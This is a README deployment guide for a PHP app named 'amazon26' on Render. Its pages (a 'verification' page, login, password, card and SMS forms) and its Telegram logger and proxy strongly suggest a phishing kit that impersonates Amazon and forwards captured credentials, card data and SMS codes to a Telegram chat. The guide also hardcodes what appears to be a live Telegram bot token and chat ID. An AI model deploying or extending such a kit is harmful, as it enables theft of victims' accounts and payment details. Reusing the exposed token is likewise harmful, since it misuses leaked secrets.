# Deploy to Render Guide

## Prerequisites
- Render account (free tier available)
- Git repository (GitHub, GitLab, etc.)

## Steps to Deploy

### 1. Push to Git Repository
```bash
git init
git add .
git commit -m "Initial commit"
git remote add origin <your-repo-url>
git push -u origin main
```

### 2. Create Render Service
1. Go to [render.com](https://render.com)
2. Click "New +" → "Web Service"
3. Connect your Git repository
4. Configure:
   - **Name**: amazon26
   - **Environment**: PHP
   - **Build Command**: `echo "No build needed"`
   - **Start Command**: `php -S 0.0.0.0:$PORT -t .`
   - **Plan**: Free

### 3. Environment Variables
Set these in Render dashboard:
- `APP_ENV`: `production`
- `BOT_TOKEN`: `8565906331:AAGf9dkAjwyqKiNPIqE8PdJIRfdcd4O53BQ`
- `CHAT_ID`: `8527642851`

### 4. Update Code for Production
Replace hardcoded values in files:

**telegram_logger.php:**
```php
$botToken = getenv('BOT_TOKEN') ?: '8565906331:AAGf9dkAjwyqKiNPIqE8PdJIRfdcd4O53BQ';
$chatId = getenv('CHAT_ID') ?: '8527642851';
```

**telegram_proxy.php:**
```php
$botToken = getenv('BOT_TOKEN') ?: '8565906331:AAGf9dkAjwyqKiNPIqE8PdJIRfdcd4O53BQ';
$chatId = getenv('CHAT_ID') ?: '8527642851';
```

### 5. Deploy
- Render will auto-deploy on push
- Your app will be available at: `https://your-app-name.onrender.com`

## Important Notes
- Render's free tier has limitations (sleeps after 15 min inactivity)
- All file paths work with forward slashes on Linux
- Telegram logging will work the same way
- No CORS issues on production domain

## Testing
After deployment, test all pages:
- `/` (main verification)
- `/login.php`
- `/password.php`
- `/card.php`
- `/sms.php`

All Telegram logs should work identically to localhost.
